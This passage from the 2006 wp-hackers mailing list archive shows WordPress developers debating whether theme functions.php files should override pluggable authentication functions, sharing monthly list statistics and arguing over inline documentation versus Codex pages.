I don't think so. {theme}/functions.php is not a plugin. It should not
be treated as one.

There are many differences between a theme's functions file and a
plugin. Let's keep it that way.

Andy
From steagl at people.it  Sat Feb 18 09:53:23 2006
From: steagl at people.it (Stefano)
Date: Sat Feb 18 09:55:24 2006
Subject: [wp-hackers] Language support for TinyMCE
References: <20060216132742.h19k6wvs0k0cssso@cs18.simplehost.com>
	<a9gbv1952d2us5qjd00uqaemmn0qf5ub13@4ax.com>
	<20060217181303.30mz10n9c480ggwg@cs18.simplehost.com>
Message-ID: <7krdv11d0q0tf60sbgeubmo8j4df28bnde@4ax.com>

Il Fri, 17 Feb 2006 18:13:03 -0500, Kirk Steffensen
<blogger@steffensenfamily.com> scrive:

>Thanks.  It's posted on Trac as ticket #2476.
>http://trac.wordpress.org/ticket/2476
>
>Quoting Stefano <steagl@people.it>:
>> +1 for me.
>>
>> I think you could submit the patch to trac so bug gardeners will check
>> it and then Ryan will do too.

Thanks for your work

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From aaron at technosailor.com  Sat Feb 18 15:56:29 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Sat Feb 18 15:58:22 2006
Subject: [wp-hackers] theme-based functions.php should override
	pluggable-functions.php
In-Reply-To: <e6ec604d0602180050k26e8cff6yf19bec2652c50506@mail.gmail.com>
References: <ca7320070602172210g6b36f3fbre11d54df9dfc493e@mail.gmail.com>
	<e6ec604d0602180050k26e8cff6yf19bec2652c50506@mail.gmail.com>
Message-ID: <ca7320070602180756n6409035dmf4adc5467dd9576@mail.gmail.com>

On 2/18/06, Andy Skelton <skeltoac@gmail.com> wrote:
>
> On 2/18/06, Aaron Brazell <aaron@technosailor.com> wrote:
> > Don't you think?
> >
> > Ticket #2479 <http://trac.wordpress.org/ticket/2479#preview> in Trac.
>
> I don't think so. {theme}/functions.php is not a plugin. It should not
> be treated as one.
>
> There are many differences between a theme's functions file and a
> plugin. Let's keep it that way.
>
> Andy
>

I know what you're saying and I am not saying {theme}/functions.php is a
plugin.  But it is user-designated and in my opinion, if a user is given
veto power over pluggable-functions.php via a plugin, he should be given it
the other way as well.

I do agree there's differences between functions.php and plugins (for
instance the added layer of protection from activation being required) --
but then I'm talking about overriding pluggable-functions, not critical
functionality.
From ringmaster at midnightcircus.com  Sat Feb 18 16:01:25 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sat Feb 18 16:03:25 2006
Subject: [wp-hackers] theme-based functions.php should override
	pluggable-functions.php
In-Reply-To: <ca7320070602180756n6409035dmf4adc5467dd9576@mail.gmail.com>
References: <ca7320070602172210g6b36f3fbre11d54df9dfc493e@mail.gmail.com>
	<e6ec604d0602180050k26e8cff6yf19bec2652c50506@mail.gmail.com>
	<ca7320070602180756n6409035dmf4adc5467dd9576@mail.gmail.com>
Message-ID: <43F744D5.2090708@midnightcircus.com>

Aaron Brazell wrote:
> I do agree there's differences between functions.php and plugins (for
> instance the added layer of protection from activation being required) --
> but then I'm talking about overriding pluggable-functions, not critical
> functionality.

Not-critical functionality like user authentication?

The reason themes now have functions.php is so that they can provide 
specialized output and configuration options, not additional functionality.

Themes should use their functions.php to be plugin-aware, not replace 
the functionality provided by plugins.

Owen

From false.hopes at gmail.com  Sat Feb 18 16:04:56 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Feb 18 16:06:50 2006
Subject: [wp-hackers] theme-based functions.php should override
	pluggable-functions.php
In-Reply-To: <ca7320070602180756n6409035dmf4adc5467dd9576@mail.gmail.com>
References: <ca7320070602172210g6b36f3fbre11d54df9dfc493e@mail.gmail.com>
	<e6ec604d0602180050k26e8cff6yf19bec2652c50506@mail.gmail.com>
	<ca7320070602180756n6409035dmf4adc5467dd9576@mail.gmail.com>
Message-ID: <a491f91d0602180804v62c65e7fs1e53a7b72905fbe7@mail.gmail.com>

On 2/18/06, Aaron Brazell <aaron@technosailor.com> wrote:
> On 2/18/06, Andy Skelton <skeltoac@gmail.com> wrote:
> >
> > On 2/18/06, Aaron Brazell <aaron@technosailor.com> wrote:
> > > Don't you think?
> > >
> > > Ticket #2479 <http://trac.wordpress.org/ticket/2479#preview> in Trac.
> >
> > I don't think so. {theme}/functions.php is not a plugin. It should not
> > be treated as one.
> >
> > There are many differences between a theme's functions file and a
> > plugin. Let's keep it that way.
> >
> > Andy
> >
>
> I know what you're saying and I am not saying {theme}/functions.php is a
> plugin.  But it is user-designated and in my opinion, if a user is given
> veto power over pluggable-functions.php via a plugin, he should be given it
> the other way as well.
>
> I do agree there's differences between functions.php and plugins (for
> instance the added layer of protection from activation being required) --
> but then I'm talking about overriding pluggable-functions, not critical
> functionality.

Overriding pluggable-functions is critical functionality, login,
cookies, userdata, admin redirection, things that a theme should never
worry about. I can't think of anything that a theme would need to do
that would require you to change the whole user or authorization
portions of the code.

Not to mention the number of themes we would potentially break because
they assume that these functions are defined, notably
get_currentuserinfo.

--
--Robert Deaton
http://somethingunpredictable.com
From aaron at technosailor.com  Sat Feb 18 16:35:43 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Sat Feb 18 16:37:37 2006
Subject: [wp-hackers] theme-based functions.php should override
	pluggable-functions.php
In-Reply-To: <a491f91d0602180804v62c65e7fs1e53a7b72905fbe7@mail.gmail.com>
References: <ca7320070602172210g6b36f3fbre11d54df9dfc493e@mail.gmail.com>
	<e6ec604d0602180050k26e8cff6yf19bec2652c50506@mail.gmail.com>
	<ca7320070602180756n6409035dmf4adc5467dd9576@mail.gmail.com>
	<a491f91d0602180804v62c65e7fs1e53a7b72905fbe7@mail.gmail.com>
Message-ID: <ca7320070602180835g54dbf064y40056f2aca55735c@mail.gmail.com>

On 2/18/06, Robert Deaton <false.hopes@gmail.com> wrote:
>
>
> Overriding pluggable-functions is critical functionality, login,
> cookies, userdata, admin redirection, things that a theme should never
> worry about. I can't think of anything that a theme would need to do
> that would require you to change the whole user or authorization
> portions of the code.
>
> Not to mention the number of themes we would potentially break because
> they assume that these functions are defined, notably
> get_currentuserinfo.
>
>
Fair enough. That's the explanation I needed.  Call this an explanation in
the theory here. I did what I needed to do by moving to a plugin anyway, so
it isn't a big deal.  Thanks for the explanation.

- Aaron
From podz at tamba2.org.uk  Sat Feb 18 20:19:47 2006
From: podz at tamba2.org.uk (Podz)
Date: Sat Feb 18 20:21:56 2006
Subject: [wp-hackers] Forum post: Accessibility Issue
Message-ID: <43F78163.1060602@tamba2.org.uk>

http://wordpress.org/support/topic/61724?replies=1

P.
From r at schestowitz.com  Sun Feb 19 04:35:34 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Sun Feb 19 04:32:54 2006
Subject: [wp-hackers] Wp-hackers Stats for January 2006
Message-ID: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>

I don't know if this will be well-received. For what it's worth:

______________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
***** People who have written most messages:
+----+-----Author-----------------------------------+--Msg-+-Percent-+
|  1 | skeltoac at gmail.com (Andy Skelton)         |   26 | 10.70 % |
|  2 | mark.wordpress at txfx.net (Mark Jaquith)    |   19 |  7.82 % |
|  3 | dmhouse at gmail.com (David House)           |   17 |  7.00 % |
|  4 | wphackers at jamietalbot.com (Jamie Talbot)  |   10 |  4.12 % |
|  5 | elharo at metalab.unc.edu (Elliotte Harold)  |   10 |  4.12 % |
|  6 | ryan at boren.nu (Ryan Boren)                |    9 |  3.70 % |
|  7 | davebytes at comcast.net (David Chait)       |    9 |  3.70 % |
|  8 | ringmaster at midnightcircus.com (Owen Winkl |    8 |  3.29 % |
|  9 | podz at tamba2.org.uk (Podz)                 |    7 |  2.88 % |
| 10 | (forsale@imaginekitty.com)                   |    7 |  2.88 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |  121 | 49.79 % |
+----+----------------------------------------------+------+---------+

***** Best authors, by total size of their messages (w/o quoting):
+----+-----Author-------------------------------------------+-KBytes-+
|  1 | skeltoac at gmail.com (Andy Skelton)                 |   65.9 |
|  2 | dmhouse at gmail.com (David House)                   |   61.7 |
|  3 | elharo at metalab.unc.edu (Elliotte Harold)          |   41.3 |
|  4 | danny.ayers at gmail.com (Danny Ayers)               |   37.4 |
|  5 | wphackers at jamietalbot.com (Jamie Talbot)          |   32.1 |
|  6 | skippy at skippy.net (Scott Merrill)                 |   24.9 |
|  7 | podz at tamba2.org.uk (Podz)                         |   22.8 |
|  8 | ckunte at gmail.com (Chetan Kunte)                   |   20.0 |
|  9 | dstewart at atl.lmco.com (Doug Stewart)              |   17.3 |
| 10 | m at mullenweg.com (Matt Mullenweg)                  |   15.9 |
+----+------------------------------------------------------+--------+

***** Best authors, by average size of their message (w/o quoting):
+----+-----Author--------------------------------------------+-bytes-+
|  1 | ckunte at gmail.com (Chetan Kunte)                    | 20470 |
|  2 | wp at igeek.info (Amit Gupta)                         |  7340 |
|  3 | stefan at hartweg.net (Stefan Hartweg)                |  6395 |
|  4 | danny.ayers at gmail.com (Danny Ayers)                |  6375 |
|  5 | mani.monajjemi at gmail.com (Mani Monajjemi)          |  5993 |
|  6 | dstewart at atl.lmco.com (Doug Stewart)               |  5894 |
|  7 | jadmadi at gmail.com (Jad Madi)                       |  4711 |
|  8 | skippy at skippy.net (Scott Merrill)                  |  4250 |
|  9 | elharo at metalab.unc.edu (Elliotte Harold)           |  4232 |
| 10 | bfults at gmail.com (Brad Fults)                      |  3883 |
+----+-------------------------------------------------------+-------+

***** Table showing the most successful subjects:
+----+----Subject-----------------------------------+--Msg-+-Percent-+
|  1 | [wp-hackers] Need more RSS hooks             |   17 |  7.00 % |
|  2 | [wp-hackers] Forum: High query count         |   15 |  6.17 % |
|  3 | [wp-hackers] 2.0 trackback issues progress?  |   15 |  6.17 % |
|  4 | [wp-hackers] Ditch RDF and RSS 0.92          |   10 |  4.12 % |
|  5 | [wp-hackers] Wordpress 1.5 downloads         |    8 |  3.29 % |
|  6 | [wp-hackers] Autosave                        |    7 |  2.88 % |
|  7 | [wp-hackers] Wordpress 2.0 trackback issues  |    7 |  2.88 % |
|  8 | [wp-hackers] Re: RSS Decisions               |    7 |  2.88 % |
|  9 | [wp-hackers] Can we do anything about PAGE S |    6 |  2.47 % |
| 10 | [wp-hackers] $cache_categories               |    6 |  2.47 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |  145 | 59.67 % |
+----+----------------------------------------------+------+---------+

***** Most used email clients:
+----+----Mailer------------------------------------+--Msg-+-Percent-+
|  1 | (unknown)                                    |  243 |100.00 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |    0 |  0.00 % |
+----+----------------------------------------------+------+---------+

***** Table of maximal quoting:
+----+-----Author------------------------------------------+-Percent-+
|  1 | choan.galvez at gmail.com (=?ISO-8859-1?Q?=22       | 79.81 % |
|  2 | kimmo+key+wordpress.c4f53f at suominen.com (K       | 75.15 % |
|  3 | matt at preinvent.com (Matthew Butt)                | 70.78 % |
|  4 | powzor at gmail.com (Rob)                           | 68.14 % |
|  5 | (forsale@imaginekitty.com)                          | 66.20 % |
|  6 | ryan at boren.nu (Ryan Boren)                       | 64.44 % |
|  7 | per at soderlind.no (=?us-ascii?Q?Per_Soderli       | 63.11 % |
|  8 | fuzzygroup at gmail.com (Scott johnson)             | 62.93 % |
|  9 | dougal at gunters.org (Dougal Campbell)             | 58.47 % |
| 10 | jason at zenenet.com (Jason S)                      | 56.42 % |
+----+-----------------------------------------------------+---------+
|    | average                                             | 28.69 % |
+----+-----------------------------------------------------+---------+

***** Graph showing number of messages written during hours of day:

100% -------------------------------------------#----- - 23
 90% -------------------------------------------#----- msgs
 80% -------------------------------------------#-----
 70% -----------------------------#-----------#-#-----
 60% -----#-----------------------#---#-#-#---#-#-----
 50% -----#-----------------------#---#-#-#---#-#-----
 40% -#-#-#-------------------#---#---#-#-#---#-#-----
 30% -#-#-#-#-#-#---------#---#-#-#-#-#-#-#---#-#-#-#-
 20% -#-#-#-#-#-#-------#-#---#-#-#-#-#-#-#-#-#-#-#-#-
 10% -#-#-#-#-#-#-#-#---#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
      * * * * * * * * * * * * * * * * * * * * * * * *
hour  0         5           11          17          23


***** Graph showing number of messages written during days of month:

100% --------------------------------------------------------------- - 0
 90% --------------------------------------------------------------- msgs
 80% ---------------------------------------------------------------
 70% ---------------------------------------------------------------
 60% ---------------------------------------------------------------
 50% ---------------------------------------------------------------
 40% ---------------------------------------------------------------
 30% ---------------------------------------------------------------
 20% ---------------------------------------------------------------
 10% ---------------------------------------------------------------
      * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 day  1         6           12          18          24            31
!!!!! Warning: 243 message(s) not counted.


***** Graph showing number of messages written during days of week:

100% -----#----------------------- - 48
 90% -#---#----------------------- msgs
 80% -#---#-------------------#---
 70% -#---#---#---------------#---
 60% -#---#---#-------#-------#---
 50% -#---#---#---#---#-------#---
 40% -#---#---#---#---#-------#---
 30% -#---#---#---#---#---#---#---
 20% -#---#---#---#---#---#---#---
 10% -#---#---#---#---#---#---#---
      *   *   *   *   *   *   *
     Mon Tue Wed Thu Fri Sat Sun


***** Maximal quoting:
      Author     : per at soderlind.no (=?us-ascii?Q?Per_Soderlind?=)
      Subject    : [wp-hackers] plugin framework class (was ]RE:
[wp-hackers] [help]
      Date       : Sat Jan 14 21:33:38 2006
      Quote ratio: 94.48% / 1394 bytes

***** Longest message:
      Author     : ckunte at gmail.com (Chetan Kunte)
      Subject    : [wp-hackers] Incremental backup and restore
      Date       : Fri Jan 27 02:18:29 2006
      Size       : 29631 bytes

***** Most successful subject:
      Subject    : [wp-hackers] Need more RSS hooks
      No. of msgs: 17
      Total size : 52077 bytes

***** Final summary:
      Total number of messages:             243
      Total number of different authors:    64
      Total number of different subjects:   78
      Total size of messages (w/o headers): 833392 bytes
      Average size of a message:            3429 bytes

***** Generated by MailListStat v1.3, (C) 2001-2003 <marki (at) nexin.sk>
***** See http://freshmeat.net/projects/mls for details...
______________________________________________________________________

I could cron this as a monthly job and keep subject lines consistent for
killfiles to be set up. If un-/interested, please say so.
From jason at zenenet.com  Sun Feb 19 04:35:20 2006
From: jason at zenenet.com (Jason S.)
Date: Sun Feb 19 04:37:12 2006
Subject: [wp-hackers] Wp-hackers Stats for January 2006
In-Reply-To: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>
References: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>
Message-ID: <43F7F588.9090902@zenenet.com>

Roy Schestowitz wrote:
> I don't know if this will be well-received. For what it's worth:
There's something wrong with this data, I'm assuming that this isn't a
'life of ML to date'?  Can you tell us at one point this log data started?

> ***** Table showing the most successful subjects:
> |  1 | [wp-hackers] Need more RSS hooks             |   17 |  7.00 % |
:D

> ***** Table of maximal quoting:
> | 10 | jason at zenenet.com (Jason S)                      | 56.42 % |
Ouch... something seems seriously wrong there.

> ***** Most successful subject:
>       Subject    : [wp-hackers] Need more RSS hooks
>       No. of msgs: 17
>       Total size : 52077 bytes
:D again
From jason at zenenet.com  Sun Feb 19 04:39:02 2006
From: jason at zenenet.com (Jason S.)
Date: Sun Feb 19 04:40:56 2006
Subject: [wp-hackers] Wp-hackers Stats for January 2006
In-Reply-To: <43F7F588.9090902@zenenet.com>
References: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>
	<43F7F588.9090902@zenenet.com>
Message-ID: <43F7F666.90108@zenenet.com>

Jason S. wrote:
> Roy Schestowitz wrote:
>> I don't know if this will be well-received. For what it's worth:
> There's something wrong with this data, I'm assuming that this isn't a
> 'life of ML to date'?  Can you tell us at one point this log data started?
...
I'm a moron.  Perhaps if I looked at the subject line of the message? _-_

This explains the quote whoring a little bit better too.

I don't mind once-a-month stats.  Though I think a pretty html page with
archives and such would be... well "cute" for lack of a better term.
From r at schestowitz.com  Sun Feb 19 05:03:13 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Sun Feb 19 05:00:32 2006
Subject: [wp-hackers] Wp-hackers Stats for January 2006
In-Reply-To: <43F7F666.90108@zenenet.com>
References: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>
	<43F7F588.9090902@zenenet.com> <43F7F666.90108@zenenet.com>
Message-ID: <20060219050313.j1qxi00uqukkgwsw@banana.catalyst2.com>

_____/ On Sun 19 Feb 2006 04:35:20 GMT, [Jason S.] wrote : \_____

> Roy Schestowitz wrote:
>> I don't know if this will be well-received. For what it's worth:
>
> There's something wrong with this data, I'm assuming that this isn't a
> 'life of ML to date'?  Can you tell us at one point this log data started?


Starting: Sun Jan 1 04:21:49 GMT 2006
Ending: Tue Jan 31 20:28:33 GMT 2006
Messages: 653

You're actually quite right as I have just doubled-checked the numbers. Many
messages get discarded, perhaps because they are improperly formatted.
grepping the raw archive, it certainly contains all messages, but that C
program sometimes aggregates several messages, treating them as just a
single.



>> ***** Table showing the most successful subjects:
>> |  1 | [wp-hackers] Need more RSS hooks             |   17 |  7.00 % |
> :D


"most successful subjects" is not my choice of words.


>> ***** Table of maximal quoting:
>> | 10 | jason at zenenet.com (Jason S)                      | 56.42 % |
>
> Ouch... something seems seriously wrong there.


Could be.


>> ***** Most successful subject:
>>       Subject    : [wp-hackers] Need more RSS hooks
>>       No. of msgs: 17
>>       Total size : 52077 bytes

_____/ On Sun 19 Feb 2006 04:39:02 GMT, [Jason S.] added : \_____

> Jason S. wrote:
>> Roy Schestowitz wrote:
>>> I don't know if this will be well-received. For what it's worth:
>> There's something wrong with this data, I'm assuming that this isn't a
>> 'life of ML to date'?  Can you tell us at one point this log data started?
> ...
>
> I'm a moron.  Perhaps if I looked at the subject line of the message? _-_
>
> This explains the quote whoring a little bit better too.
>
> I don't mind once-a-month stats.  Though I think a pretty html page with
> archives and such would be... well "cute" for lack of a better term.


It exists already, but I just thought it was slightly crude.

http://comox.textdrive.com/pipermail/wp-hackers/

I won't be doing that again, I promise. *smile*

From dmhouse at gmail.com  Sun Feb 19 09:29:01 2006
From: dmhouse at gmail.com (David House)
Date: Sun Feb 19 09:30:58 2006
Subject: [wp-hackers] Wp-hackers Stats for January 2006
In-Reply-To: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>
References: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>
Message-ID: <ebe43d680602190129x3f62af4bh@mail.gmail.com>

On 19/02/06, Roy Schestowitz <r@schestowitz.com> wrote:
> I could cron this as a monthly job and keep subject lines consistent for
> killfiles to be set up. If un-/interested, please say so.

Yeah, that'd be quite interesting.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From podz at tamba2.org.uk  Sun Feb 19 10:02:47 2006
From: podz at tamba2.org.uk (Podz)
Date: Sun Feb 19 10:04:49 2006
Subject: [wp-hackers] Forum post: Accessibility Issue
In-Reply-To: <43F78163.1060602@tamba2.org.uk>
References: <43F78163.1060602@tamba2.org.uk>
Message-ID: <43F84247.3010508@tamba2.org.uk>

Podz wrote:
> http://wordpress.org/support/topic/61724?replies=1
> 

There's been no answer yet to the above, but looking about I can't find
a list of keyboard shortcuts that people can use in WP. Is there a list
? Do they use ones from elsewhere ? I've read here sometimes about
conflicts of some sort. (I speak as a mouse user :) )
A list would be useful and might also highlight holes that need addressing ?

And with that forum post, if there is no answer (because changing
browser as suggested is not one) then can someone just say ? We'll know
for the future then.

P.
From rbowen at rcbowen.com  Sun Feb 19 20:11:36 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Sun Feb 19 20:13:43 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <a491f91d0602171341y61b45966saa7e6310bd9e0a44@mail.gmail.com>
References: <43F5010D.6070304@rcbowen.com>	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>	<43F5D34C.3080809@rcbowen.com>	<5aa3aa0602170954n1b0d911fl2d0069c33be44f2@mail.gmail.com>	<80f75db0602171003p1c070bddm9259677329ea6f02@mail.gmail.com>	<43F619FB.90609@rcbowen.com>
	<a491f91d0602171341y61b45966saa7e6310bd9e0a44@mail.gmail.com>
Message-ID: <43F8D0F8.2050403@rcbowen.com>

Robert Deaton wrote:
> On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
>> Carthik Sharma wrote:
>>> On 2/17/06, Craig <nuclearmoose@gmail.com> wrote:
>>>> On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
>>>>> I'm going for API documentation, not "use this to learn how to write
>>>>> PHP" documentation. It is assumed that folks will be willing to learn
>>>>> what the notation means. And once you've learned it, the docs become
>>>>> clear.
>>> Rich, I suppose we both agree we are working towards something that is
>>> immediately useful to programmers. The benefit of using a system, such
>>> as phpdocumentor, for one, is that people can read the same comments,
>>> and browse the source at an automatically generated webpage. So it
>>> might be better to adapt to an existing system rather than create a
>>> new lingo (like it is better to use WP that to hand code a blog :) )
>> I think I've been won around to this syntax. I'm concerned, however,
>> with the notion that we'll only document long functions. This causes
>> them to be left out of the generated webpage entirely.
> 
> Like I said in the other thread, I will personally be documenting them
> anyways and submitting the patches, no matter how trivial the
> functions may be. Perhaps such will be a wakeup call in the sense that
> this function pollution crap could use some fixing as well.

Speaking of function pollution ...

I've been experimenting with Zend Studio, and in addition to practically
writing all the phpdoc for you, it also does code analysis for stuff
like variables that are never used, and code that is never executed. I
think if we're concerned about "bloat" we could stand to drop the
function or two that never gets used.

-- 
Rich Bowen
rbowen@rcbowen.com
From r at robm.me.uk  Sun Feb 19 20:24:42 2006
From: r at robm.me.uk (Rob)
Date: Sun Feb 19 20:25:51 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <43F8D0F8.2050403@rcbowen.com>
References: <43F5010D.6070304@rcbowen.com>	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>	<43F5D34C.3080809@rcbowen.com>	<5aa3aa0602170954n1b0d911fl2d0069c33be44f2@mail.gmail.com>	<80f75db0602171003p1c070bddm9259677329ea6f02@mail.gmail.com>	<43F619FB.90609@rcbowen.com>	<a491f91d0602171341y61b45966saa7e6310bd9e0a44@mail.gmail.com>
	<43F8D0F8.2050403@rcbowen.com>
Message-ID: <43F8D40A.8010108@robm.me.uk>

Rich Bowen wrote:
> Robert Deaton wrote:
>   
>> On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
>>     
>>> Carthik Sharma wrote:
>>>       
>>>> On 2/17/06, Craig <nuclearmoose@gmail.com> wrote:
>>>>         
>>>>> On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
>>>>>           
>>>>>> I'm going for API documentation, not "use this to learn how to write
>>>>>> PHP" documentation. It is assumed that folks will be willing to learn
>>>>>> what the notation means. And once you've learned it, the docs become
>>>>>> clear.
>>>>>>             
>>>> Rich, I suppose we both agree we are working towards something that is
>>>> immediately useful to programmers. The benefit of using a system, such
>>>> as phpdocumentor, for one, is that people can read the same comments,
>>>> and browse the source at an automatically generated webpage. So it
>>>> might be better to adapt to an existing system rather than create a
>>>> new lingo (like it is better to use WP that to hand code a blog :) )
>>>>         
>>> I think I've been won around to this syntax. I'm concerned, however,
>>> with the notion that we'll only document long functions. This causes
>>> them to be left out of the generated webpage entirely.
>>>       
>> Like I said in the other thread, I will personally be documenting them
>> anyways and submitting the patches, no matter how trivial the
>> functions may be. Perhaps such will be a wakeup call in the sense that
>> this function pollution crap could use some fixing as well.
>>     
>
> Speaking of function pollution ...
>
> I've been experimenting with Zend Studio, and in addition to practically
> writing all the phpdoc for you, it also does code analysis for stuff
> like variables that are never used, and code that is never executed. I
> think if we're concerned about "bloat" we could stand to drop the
> function or two that never gets used.
>
>   
Functions might not be used in the core, but might provide useful API 
functions to plugins and thus need to remain.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From mikea at turbonet.com  Sun Feb 19 23:09:42 2006
From: mikea at turbonet.com (Michael D Adams)
Date: Sun Feb 19 23:10:38 2006
Subject: [wp-hackers] Better comment feed flexibility
Message-ID: <5FD12E37-8D6E-4B75-979F-36B310E630A4@turbonet.com>

Currently, the content of the comment feeds is hardwired and not  
accessible by plugin.

http://trac.wordpress.org/ticket/2485

The patch on that ticket is a somewhat hacked together attempt to  
allow for comment feeds from categories, searches, dates, posts,  
pages and the main page.  The DB query is filtered to let plugins  
have at it.

Thoughts?

Michael Adams
mdawaffe
From kimmo+key+wordpress.c4f53f at suominen.com  Sun Feb 19 23:39:01 2006
From: kimmo+key+wordpress.c4f53f at suominen.com (Kimmo Suominen)
Date: Sun Feb 19 23:41:01 2006
Subject: [wp-hackers] Wp-hackers Stats for January 2006
In-Reply-To: <ebe43d680602190129x3f62af4bh@mail.gmail.com>
References: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>
	<ebe43d680602190129x3f62af4bh@mail.gmail.com>
Message-ID: <20060219233901.GM8319@kimmo.suominen.com>

On 19/02/06, Roy Schestowitz <r@schestowitz.com> wrote:
> I could cron this as a monthly job and keep subject lines consistent for
> killfiles to be set up. If un-/interested, please say so.

Why not set it up as a web page instead of regularly broadcasting to the
list?  Comparatively, the stats message was quite long...

Best regards,
+ Kimmo
-- 
<A HREF="http://kimmo.suominen.com/">Kimmo Suominen</A>

From m at mullenweg.com  Mon Feb 20 00:00:16 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon Feb 20 00:02:23 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>	<43F5E655.1080608@rcbowen.com>
	<43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
Message-ID: <43F90690.9030003@mullenweg.com>

David House wrote:
> As Matt has expressed his distaste for comments before really short
> functions, here's a more complicated example for list_cats()
> (attached).

What you attached looks like a complicated and less readable version of 
this:

http://codex.wordpress.org/Template_Tags/list_cats

Maybe we should just have a link to a Codex page for each complicated 
function? That has the side effect of being printable and googleable. It 
can also be updated by anyone, and include rich examples and/or screenshots.

I really don't care about people's specialized editors.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From chris.lott at gmail.com  Mon Feb 20 00:07:28 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Mon Feb 20 00:09:22 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F90690.9030003@mullenweg.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F90690.9030003@mullenweg.com>
Message-ID: <9b1b9dab0602191607k5fac4532od629da517e07ea34@mail.gmail.com>

On 2/19/06, Matt Mullenweg <m@mullenweg.com> wrote:
> I really don't care about people's specialized editors.

Or people developing in their own online environment and/or those who
find the Codex slow and tedious to navigate when they just want a
simple piece of information about a function they are currently
tryhing to work with... which the given solutions provide at no *real*
cost whatsoever except, apparently, Matt's aesthetic sensibility. But
we all know that everyone but the pumpking must compromise.

+1 for WP community support.

c
From false.hopes at gmail.com  Mon Feb 20 00:20:12 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Feb 20 00:22:10 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F90690.9030003@mullenweg.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F90690.9030003@mullenweg.com>
Message-ID: <a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>

On 2/20/06, Matt Mullenweg <m@mullenweg.com> wrote:
> David House wrote:
> > As Matt has expressed his distaste for comments before really short
> > functions, here's a more complicated example for list_cats()
> > (attached).
>
> What you attached looks like a complicated and less readable version of
> this:
>
> http://codex.wordpress.org/Template_Tags/list_cats
>
> Maybe we should just have a link to a Codex page for each complicated
> function? That has the side effect of being printable and googleable. It
> can also be updated by anyone, and include rich examples and/or screenshots.

-1, the codex is far too unreliable as far as I'm concerned, half the
time its timing out, nowadays its been giving random 500 errors, the
rest of the time its terribly slow. On being less readable, I think it
has the advantage of being easier to read than shifting through all
kinds of useless stuff for developers that's located on the codex,
since it is geared more toward the end users than those developing the
source.


--
--Robert Deaton
http://somethingunpredictable.com
From r at robm.me.uk  Mon Feb 20 01:03:06 2006
From: r at robm.me.uk (Rob)
